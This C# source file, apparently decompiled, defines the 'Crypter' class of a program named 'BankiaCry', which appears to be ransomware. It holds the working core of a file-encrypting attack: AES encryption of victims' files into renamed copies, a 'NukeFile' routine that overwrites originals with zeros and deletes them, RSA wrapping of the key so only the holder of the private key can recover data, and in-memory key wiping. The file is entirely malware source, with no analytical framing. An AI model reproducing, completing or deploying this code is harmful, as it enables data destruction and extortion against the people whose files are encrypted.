using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

namespace BankiaCry;

internal class Crypter
{
	private GCHandle gCHandleKey;

	private GCHandle gcHandleIV;

	public X509Certificate2 _RSACert { get; set; }

	public byte[] _AESKey { get; set; }

	public byte[] _AESIV { get; set; }

	[DllImport("KERNEL32.DLL")]
	private static extern bool RtlZeroMemory(IntPtr dst, int length);

	public Crypter(byte[] AESKey, byte[] AESIV)
	{
		_AESKey = AESKey;
		_AESIV = AESIV;
		gCHandleKey = GCHandle.Alloc(_AESKey, GCHandleType.Pinned);
		gcHandleIV = GCHandle.Alloc(_AESIV, GCHandleType.Pinned);
	}

	public Crypter(X509Certificate2 RSACert)
	{
		_RSACert = RSACert;
	}

	public void AES_EncryptFile(string filePath)
	{
		FileStream fileStream = new FileStream(filePath, FileMode.Open);
		using Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.Key = _AESKey;
		aes.IV = _AESIV;
		aes.Padding = PaddingMode.PKCS7;
		byte[] array = new byte[5242880];
		using FileStream stream = new FileStream(filePath + Config.GetEncryptedExtension(), FileMode.Create);
		using CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		try
		{
			int num = 0;
			int num2;
			while ((num2 = fileStream.Read(array, 0, array.Length)) > 0)
			{
				cryptoStream.Write(array, 0, num2);
				num += num2;
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			fileStream.Close();
		}
	}

	public static int NukeFile(string filePath)
	{
		int result = 0;
		using (FileStream fileStream = File.OpenWrite(filePath))
		{
			int num = (int)fileStream.Length;
			fileStream.Seek(0L, SeekOrigin.Begin);
			fileStream.Write(Enumerable.Repeat((byte)0, num).ToArray(), 0, num);
			fileStream.Flush(flushToDisk: true);
			result = num;
		}
		File.Delete(filePath);
		return result;
	}

	public MemoryStream AES_DecryptFile(string filePath)
	{
		FileStream fileStream = new FileStream(filePath, FileMode.Open);
		MemoryStream memoryStream = new MemoryStream();
		using (Aes aes = Aes.Create())
		{
			aes.Key = _AESKey;
			aes.IV = _AESIV;
			using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
			int num = 0;
			byte[] array = new byte[5242880];
			int num2 = 0;
			while ((num = cryptoStream.Read(array, 0, array.Length)) > 0)
			{
				memoryStream.Write(array, 0, num);
				num2 += num;
			}
		}
		fileStream.Close();
		return memoryStream;
	}

	public void CleanUp()
	{
		if (_AESIV != null && _AESKey != null)
		{
			RtlZeroMemory(gCHandleKey.AddrOfPinnedObject(), _AESKey.Length * 2);
			RtlZeroMemory(gcHandleIV.AddrOfPinnedObject(), _AESIV.Length * 2);
		}
		else if (_RSACert != null)
		{
			_RSACert.Dispose();
		}
	}

	public MemoryStream RSAEncryptBytes(MemoryStream toEncrypt)
	{
		int num = 0;
		using RSA rSA = _RSACert.GetRSAPublicKey();
		int num2 = rSA.KeySize / 8 - 42;
		byte[] array = new byte[num2];
		MemoryStream memoryStream = new MemoryStream((int)toEncrypt.Length);
		while ((num = toEncrypt.Read(array, 0, num2)) == num2)
		{
			byte[] array2 = rSA.Encrypt(array, RSAEncryptionPadding.OaepSHA1);
			memoryStream.Write(array2, 0, array2.Length);
		}
		byte[] data = array.Take(num).ToArray();
		byte[] array3 = rSA.Encrypt(data, RSAEncryptionPadding.OaepSHA1);
		memoryStream.Write(array3, 0, array3.Length);
		memoryStream.Seek(0L, SeekOrigin.Begin);
		return memoryStream;
	}
}
